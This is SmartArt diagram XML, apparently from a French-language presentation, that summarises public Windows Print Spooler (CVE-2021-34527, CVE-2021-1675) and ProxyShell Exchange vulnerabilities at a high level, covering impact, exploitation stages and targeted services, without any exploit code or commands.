    <dgm:cxn modelId="{1A4B336D-5EB0-AD4F-AA29-8BEFF409B08A}" type="presParOf" srcId="{D51D35FC-DE56-F148-9A3D-432D61E15E9E}" destId="{EA8FC166-9B44-DC47-8653-FB0DB926AFF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9EF42B0-EF4D-42E8-8C42-DAAE6296394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4C74E5C-5F39-44C1-B328-6C338376B9AE}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Une vulnérabilité critique affectant le </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Windows Print Spooler</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7EDAF71E-7C65-43A1-9A74-2E44244C672A}" type="parTrans" cxnId="{D0F95CBF-0326-45AE-A7F2-B37F94302027}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E5C15AA0-FBCB-435A-88B0-6860A1F2B788}" type="sibTrans" cxnId="{D0F95CBF-0326-45AE-A7F2-B37F94302027}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E099C416-5FE5-440B-8454-4A1009419461}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Permet l'exécution de code à distance (RCE) et/ou l'élévation de privilèges (LPE).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{A7753D01-5C8E-4AC5-81D4-1DB4C8B3D766}" type="parTrans" cxnId="{412C0803-5403-4D3E-90B4-58608A06CF7F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{161E6751-9B2D-472F-B850-D827A0C9A593}" type="sibTrans" cxnId="{412C0803-5403-4D3E-90B4-58608A06CF7F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B2EA0949-B843-4A3F-BE0F-329DFA29B839}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Références principales : </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>CVE-2021-34527</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>, </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>CVE-2021-1675</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B8220E76-FDEE-4B41-9030-91C297155790}" type="parTrans" cxnId="{1C89D55E-399D-48A0-8A70-2BF65003A214}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2C760053-E2D2-492D-BE5B-DE32BD344FEF}" type="sibTrans" cxnId="{1C89D55E-399D-48A0-8A70-2BF65003A214}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6A9D6CB6-64BB-4208-A848-F909DF14E509}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Impact :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7DD9D106-D74F-440A-9AC9-56CCD24FEAF2}" type="parTrans" cxnId="{824B5B31-B287-4313-A04C-37D51423F7D3}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B0E85866-B2E2-4D6B-A355-481C123BB631}" type="sibTrans" cxnId="{824B5B31-B287-4313-A04C-37D51423F7D3}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D688C12E-7635-4A34-9845-43B64BC7D622}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Présente sur de nombreuses versions de Windows, incluant des serveurs.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{451D365E-4690-4174-BB94-0DC1B6CFDA5E}" type="parTrans" cxnId="{016BC27B-C0D3-4FA3-A01F-59FC66BD6258}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{EE5387BA-F1F6-4935-AE3D-A7009D3D3D67}" type="sibTrans" cxnId="{016BC27B-C0D3-4FA3-A01F-59FC66BD6258}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9484ED52-94E8-4B1F-ABFA-09B2C37DCB56}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Exploitable même dans des environnements internes avec des configurations par défaut.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F65BFE85-954F-49A1-AA9E-D0A8AEE2FD20}" type="parTrans" cxnId="{6A421188-0844-496B-9236-CBA25C029011}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5439E24B-3C77-43E9-A7C6-AF8AD001B6CC}" type="sibTrans" cxnId="{6A421188-0844-496B-9236-CBA25C029011}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{780486A2-56C6-754D-85A8-602D4152EE3C}" type="pres">
      <dgm:prSet presAssocID="{F9EF42B0-EF4D-42E8-8C42-DAAE6296394C}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{C1F4E90A-D3C2-194E-B095-1A94C82708C0}" type="pres">
      <dgm:prSet presAssocID="{A4C74E5C-5F39-44C1-B328-6C338376B9A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37D602A-B2B7-5942-98FF-A5138D2A0F0A}" type="pres">
      <dgm:prSet presAssocID="{A4C74E5C-5F39-44C1-B328-6C338376B9AE}" presName="childText" presStyleLbl="revTx" presStyleIdx="0" presStyleCnt="2">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{4845A103-8561-A24B-B057-46A5958AE552}" type="pres">
      <dgm:prSet presAssocID="{6A9D6CB6-64BB-4208-A848-F909DF14E50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6A5A331-7DEA-2141-B065-21515FE79B2D}" type="pres">
      <dgm:prSet presAssocID="{6A9D6CB6-64BB-4208-A848-F909DF14E50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12C0803-5403-4D3E-90B4-58608A06CF7F}" srcId="{A4C74E5C-5F39-44C1-B328-6C338376B9AE}" destId="{E099C416-5FE5-440B-8454-4A1009419461}" srcOrd="0" destOrd="0" parTransId="{A7753D01-5C8E-4AC5-81D4-1DB4C8B3D766}" sibTransId="{161E6751-9B2D-472F-B850-D827A0C9A593}"/>
    <dgm:cxn modelId="{824B5B31-B287-4313-A04C-37D51423F7D3}" srcId="{F9EF42B0-EF4D-42E8-8C42-DAAE6296394C}" destId="{6A9D6CB6-64BB-4208-A848-F909DF14E509}" srcOrd="1" destOrd="0" parTransId="{7DD9D106-D74F-440A-9AC9-56CCD24FEAF2}" sibTransId="{B0E85866-B2E2-4D6B-A355-481C123BB631}"/>
    <dgm:cxn modelId="{D7127544-C9E3-BC41-8DCD-21F701A13230}" type="presOf" srcId="{6A9D6CB6-64BB-4208-A848-F909DF14E509}" destId="{4845A103-8561-A24B-B057-46A5958AE552}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{C16BF25C-ACC7-F643-B6D2-94A61756CC47}" type="presOf" srcId="{F9EF42B0-EF4D-42E8-8C42-DAAE6296394C}" destId="{780486A2-56C6-754D-85A8-602D4152EE3C}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{1C89D55E-399D-48A0-8A70-2BF65003A214}" srcId="{A4C74E5C-5F39-44C1-B328-6C338376B9AE}" destId="{B2EA0949-B843-4A3F-BE0F-329DFA29B839}" srcOrd="1" destOrd="0" parTransId="{B8220E76-FDEE-4B41-9030-91C297155790}" sibTransId="{2C760053-E2D2-492D-BE5B-DE32BD344FEF}"/>
    <dgm:cxn modelId="{BEC7A35F-70F6-F847-8C6E-B8EB875165D5}" type="presOf" srcId="{E099C416-5FE5-440B-8454-4A1009419461}" destId="{F37D602A-B2B7-5942-98FF-A5138D2A0F0A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{016BC27B-C0D3-4FA3-A01F-59FC66BD6258}" srcId="{6A9D6CB6-64BB-4208-A848-F909DF14E509}" destId="{D688C12E-7635-4A34-9845-43B64BC7D622}" srcOrd="0" destOrd="0" parTransId="{451D365E-4690-4174-BB94-0DC1B6CFDA5E}" sibTransId="{EE5387BA-F1F6-4935-AE3D-A7009D3D3D67}"/>
    <dgm:cxn modelId="{417E7E7D-96FA-1543-A6DE-A22FD52BA815}" type="presOf" srcId="{A4C74E5C-5F39-44C1-B328-6C338376B9AE}" destId="{C1F4E90A-D3C2-194E-B095-1A94C82708C0}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{E232C085-7DC7-5D45-B7F1-0D481416BA59}" type="presOf" srcId="{9484ED52-94E8-4B1F-ABFA-09B2C37DCB56}" destId="{D6A5A331-7DEA-2141-B065-21515FE79B2D}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{6A421188-0844-496B-9236-CBA25C029011}" srcId="{6A9D6CB6-64BB-4208-A848-F909DF14E509}" destId="{9484ED52-94E8-4B1F-ABFA-09B2C37DCB56}" srcOrd="1" destOrd="0" parTransId="{F65BFE85-954F-49A1-AA9E-D0A8AEE2FD20}" sibTransId="{5439E24B-3C77-43E9-A7C6-AF8AD001B6CC}"/>
    <dgm:cxn modelId="{7D475FAB-8FC9-AC45-A6E9-A26EA089EB55}" type="presOf" srcId="{B2EA0949-B843-4A3F-BE0F-329DFA29B839}" destId="{F37D602A-B2B7-5942-98FF-A5138D2A0F0A}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{D4BC86BC-6349-BD4C-8E19-86015DAC5445}" type="presOf" srcId="{D688C12E-7635-4A34-9845-43B64BC7D622}" destId="{D6A5A331-7DEA-2141-B065-21515FE79B2D}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{D0F95CBF-0326-45AE-A7F2-B37F94302027}" srcId="{F9EF42B0-EF4D-42E8-8C42-DAAE6296394C}" destId="{A4C74E5C-5F39-44C1-B328-6C338376B9AE}" srcOrd="0" destOrd="0" parTransId="{7EDAF71E-7C65-43A1-9A74-2E44244C672A}" sibTransId="{E5C15AA0-FBCB-435A-88B0-6860A1F2B788}"/>
    <dgm:cxn modelId="{B1400B3C-8493-EF4A-90E5-95DE5DDD5A48}" type="presParOf" srcId="{780486A2-56C6-754D-85A8-602D4152EE3C}" destId="{C1F4E90A-D3C2-194E-B095-1A94C82708C0}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{65A0FFAA-C8C4-E04A-9861-2F90D6E2F407}" type="presParOf" srcId="{780486A2-56C6-754D-85A8-602D4152EE3C}" destId="{F37D602A-B2B7-5942-98FF-A5138D2A0F0A}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{C464C342-DB5A-D24B-904B-D8B565605A75}" type="presParOf" srcId="{780486A2-56C6-754D-85A8-602D4152EE3C}" destId="{4845A103-8561-A24B-B057-46A5958AE552}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{EEC37491-A07B-4440-B81B-9F170F89F292}" type="presParOf" srcId="{780486A2-56C6-754D-85A8-602D4152EE3C}" destId="{D6A5A331-7DEA-2141-B065-21515FE79B2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8CCA995-E50D-4489-88E3-8CC70BFAE7B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3F4FBF6-E709-4F08-860C-A7310C75809C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Exemple 3 : ProxyShell (2021)</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7FE45E0D-72B6-4EDB-ABA7-5D8FF98E5DB9}" type="parTrans" cxnId="{F792420C-3676-49D4-A749-825D40AB338F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E1EDE298-54F5-4141-AA9B-CECD84C1742B}" type="sibTrans" cxnId="{F792420C-3676-49D4-A749-825D40AB338F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{86FF0D20-FCF9-4BD2-A6F4-7D09DDAAEFEC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Contexte :</a:t>
          </a:r>
          <a:br>
            <a:rPr lang="en-GB"/>
          </a:br>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Vulnérabilités affectant Microsoft Exchange Server.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9134B5C4-E0F7-496C-B742-F8B834B71AA8}" type="parTrans" cxnId="{70859947-FE93-41FE-BE61-5DF846A4A02A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{138153E5-AB0B-45E4-9835-58ACE6D0E230}" type="sibTrans" cxnId="{70859947-FE93-41FE-BE61-5DF846A4A02A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{EE017C05-A129-457C-8C26-57196764661C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Exploitation en trois étapes : pré-authentification, contrôle et exécution de commandes.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{51C88EEC-D4D0-4101-8721-30D1B093B5F1}" type="parTrans" cxnId="{1310FEDB-83E5-4DE4-9C00-CB8294438CE0}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{A2F48086-A839-4416-9021-FE18DE348266}" type="sibTrans" cxnId="{1310FEDB-83E5-4DE4-9C00-CB8294438CE0}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{75EBF4B3-CE79-49FC-8351-CC4F9466FFAF}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Impact :</a:t>
          </a:r>
          <a:br>
            <a:rPr lang="en-GB"/>
          </a:br>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Utilisé massivement par des attaquants pour installer des backdoors.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E13FFAE5-D191-4EA8-B146-F957343D6E28}" type="parTrans" cxnId="{B73D8025-D1BB-4844-AC62-158B51A47078}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{42C5FBB0-6750-4EF9-8CC1-49AB53B5A12B}" type="sibTrans" cxnId="{B73D8025-D1BB-4844-AC62-158B51A47078}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6138BF1A-6C8A-3647-B42F-D27CB763BD86}" type="pres">
      <dgm:prSet presAssocID="{38CCA995-E50D-4489-88E3-8CC70BFAE7B1}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{CB051B07-221A-754D-BAA5-81F43E2E7693}" type="pres">
      <dgm:prSet presAssocID="{33F4FBF6-E709-4F08-860C-A7310C75809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B356253-0F80-4547-9A68-2D599692ABEC}" type="pres">
      <dgm:prSet presAssocID="{E1EDE298-54F5-4141-AA9B-CECD84C1742B}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{04E5EAA8-89F6-8842-B3DD-61F42376F082}" type="pres">
      <dgm:prSet presAssocID="{86FF0D20-FCF9-4BD2-A6F4-7D09DDAAEFE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2ED4D58-9864-DB42-B51A-BAB7F860F017}" type="pres">
      <dgm:prSet presAssocID="{86FF0D20-FCF9-4BD2-A6F4-7D09DDAAEFEC}" presName="childText" presStyleLbl="revTx" presStyleIdx="0" presStyleCnt="1">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B9574AF1-FF0A-404D-8153-4838480E45DC}" type="pres">
      <dgm:prSet presAssocID="{75EBF4B3-CE79-49FC-8351-CC4F9466FFA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792420C-3676-49D4-A749-825D40AB338F}" srcId="{38CCA995-E50D-4489-88E3-8CC70BFAE7B1}" destId="{33F4FBF6-E709-4F08-860C-A7310C75809C}" srcOrd="0" destOrd="0" parTransId="{7FE45E0D-72B6-4EDB-ABA7-5D8FF98E5DB9}" sibTransId="{E1EDE298-54F5-4141-AA9B-CECD84C1742B}"/>
    <dgm:cxn modelId="{B73D8025-D1BB-4844-AC62-158B51A47078}" srcId="{38CCA995-E50D-4489-88E3-8CC70BFAE7B1}" destId="{75EBF4B3-CE79-49FC-8351-CC4F9466FFAF}" srcOrd="2" destOrd="0" parTransId="{E13FFAE5-D191-4EA8-B146-F957343D6E28}" sibTransId="{42C5FBB0-6750-4EF9-8CC1-49AB53B5A12B}"/>
    <dgm:cxn modelId="{70859947-FE93-41FE-BE61-5DF846A4A02A}" srcId="{38CCA995-E50D-4489-88E3-8CC70BFAE7B1}" destId="{86FF0D20-FCF9-4BD2-A6F4-7D09DDAAEFEC}" srcOrd="1" destOrd="0" parTransId="{9134B5C4-E0F7-496C-B742-F8B834B71AA8}" sibTransId="{138153E5-AB0B-45E4-9835-58ACE6D0E230}"/>
    <dgm:cxn modelId="{FC9B6850-B627-CA44-8FB6-26A86811E433}" type="presOf" srcId="{38CCA995-E50D-4489-88E3-8CC70BFAE7B1}" destId="{6138BF1A-6C8A-3647-B42F-D27CB763BD86}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{66E10465-04B8-0549-BF3C-DC304804F5D9}" type="presOf" srcId="{EE017C05-A129-457C-8C26-57196764661C}" destId="{B2ED4D58-9864-DB42-B51A-BAB7F860F017}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{AA3DF995-ABE1-824F-ABEF-957D810E242A}" type="presOf" srcId="{33F4FBF6-E709-4F08-860C-A7310C75809C}" destId="{CB051B07-221A-754D-BAA5-81F43E2E7693}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{4C3648BF-406F-BE45-988C-21EBD6A94804}" type="presOf" srcId="{75EBF4B3-CE79-49FC-8351-CC4F9466FFAF}" destId="{B9574AF1-FF0A-404D-8153-4838480E45DC}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{1310FEDB-83E5-4DE4-9C00-CB8294438CE0}" srcId="{86FF0D20-FCF9-4BD2-A6F4-7D09DDAAEFEC}" destId="{EE017C05-A129-457C-8C26-57196764661C}" srcOrd="0" destOrd="0" parTransId="{51C88EEC-D4D0-4101-8721-30D1B093B5F1}" sibTransId="{A2F48086-A839-4416-9021-FE18DE348266}"/>
    <dgm:cxn modelId="{0E3224EF-C06C-9249-855C-A09C3CA44FC7}" type="presOf" srcId="{86FF0D20-FCF9-4BD2-A6F4-7D09DDAAEFEC}" destId="{04E5EAA8-89F6-8842-B3DD-61F42376F082}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{C746972B-4B66-6C44-BA32-F515FA3C40F5}" type="presParOf" srcId="{6138BF1A-6C8A-3647-B42F-D27CB763BD86}" destId="{CB051B07-221A-754D-BAA5-81F43E2E7693}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{AB82081A-6EF7-D54D-9DB7-DCAD150065B1}" type="presParOf" srcId="{6138BF1A-6C8A-3647-B42F-D27CB763BD86}" destId="{8B356253-0F80-4547-9A68-2D599692ABEC}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{27432B83-9827-4F48-9B3C-0CECB89C7328}" type="presParOf" srcId="{6138BF1A-6C8A-3647-B42F-D27CB763BD86}" destId="{04E5EAA8-89F6-8842-B3DD-61F42376F082}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{9A13D902-855B-3A45-97F6-B65737D98181}" type="presParOf" srcId="{6138BF1A-6C8A-3647-B42F-D27CB763BD86}" destId="{B2ED4D58-9864-DB42-B51A-BAB7F860F017}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{D1636B73-DCEE-4F41-ABC7-8A4451DE1E43}" type="presParOf" srcId="{6138BF1A-6C8A-3647-B42F-D27CB763BD86}" destId="{B9574AF1-FF0A-404D-8153-4838480E45D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3C5A21B-F0C7-461A-85C3-5D7723F82AD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3807BF6-6D3F-4ED0-94F3-0A977B577208}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:defRPr b="1"/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Architecture ciblée :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7A39EECD-816D-4D8E-9F26-A275BA2E6377}" type="parTrans" cxnId="{23318193-F4E6-4BEA-9C46-7FA2260F88E1}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4D18885E-46DE-4816-8485-3F0940571307}" type="sibTrans" cxnId="{23318193-F4E6-4BEA-9C46-7FA2260F88E1}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{09662562-56F8-48BB-8F05-734454BC72CC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Services Microsoft Exchange exposés en ligne (OWA, ECP, etc.).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F218FB4B-2AE7-4448-8760-EC84120C4E2F}" type="parTrans" cxnId="{C8ADBCDD-65DF-4511-97A8-3C8BD6A766F5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{A9023CA2-CFC9-4ECC-BD71-A9CAB8A11514}" type="sibTrans" cxnId="{C8ADBCDD-65DF-4511-97A8-3C8BD6A766F5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5D4BDB03-9350-43A0-B42B-0056C5A543F5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Ports standards : 443 (HTTPS), 80 (HTTP).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3145F5F8-C40C-4AF2-92B4-4138F607F54B}" type="parTrans" cxnId="{61B087ED-D41C-4B03-B769-2A683371F2DC}">
